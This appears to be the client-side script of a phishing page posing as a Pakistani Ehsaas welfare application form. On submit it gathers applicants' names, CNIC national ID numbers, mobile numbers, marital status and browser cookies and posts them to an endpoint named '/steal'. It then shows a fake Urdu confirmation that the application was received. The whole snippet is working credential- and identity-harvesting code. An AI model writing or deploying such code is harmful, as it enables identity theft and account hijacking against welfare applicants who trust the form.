document.getElementById("ehsaasForm").addEventListener("submit", function (e) {
  e.preventDefault();
  let data = new FormData(this);

  // Add cookies as bonus
  let cookies = document.cookie || "NO_COOKIES";

  let payload = {
    name: data.get("name"),
    cnic: data.get("cnic"),
    mobile: data.get("mobile"),
    amount: data.get("amount"),
    married: data.get("married"),
    cookie: cookies
  };

  fetch("/steal", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });

  // Optional redirect or fake success
  alert("آپ کی درخواست جمع ہو گئی ہے۔ براہ کرم انتظار کریں...");
});
